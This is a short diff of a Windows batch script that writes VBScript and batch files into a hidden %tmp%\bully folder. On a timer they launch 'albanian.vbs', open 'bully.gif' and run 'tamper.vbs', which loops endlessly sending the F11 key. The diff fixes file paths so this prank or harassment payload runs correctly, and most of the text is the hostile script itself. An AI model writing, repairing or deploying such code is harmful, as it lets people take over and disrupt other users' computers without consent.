@@ -14,11 +14,11 @@ echo wscript.sleep 100 >> %tmp%\bully\tamper.vbs
 echo x.sendkeys "{F11}" >> %tmp%\bully\tamper.vbs
 echo loop >> %tmp%\bully\tamper.vbs
 echo timeout /t %timer% > %tmp%\bully\main.bat
-echo start albanian.vbs >> %tmp%\bully\main.bat
+echo %tmp%\bully\albanian.vbs >> %tmp%\bully\main.bat
 echo timeout /t 30 >> %tmp%\bully\main.bat
-echo bully.gif >> %tmp%\bully\main.bat
+echo %tmp%\bully\bully.gif >> %tmp%\bully\main.bat
 echo timeout /t 3 >> %tmp%\bully\main.bat
-echo tamper.vbs >> %tmp%\bully\main.bat
+echo %tmp%\bully\tamper.vbs >> %tmp%\bully\main.bat
 echo Set oShell = CreateObject ("Wscript.Shell") > %tmp%\bully\main.vbs
 echo Dim strArgs >> %tmp%\bully\main.vbs
 echo strArgs = "cmd /c %tmp%\bully\main.bat" >> %tmp%\bully\main.vbs
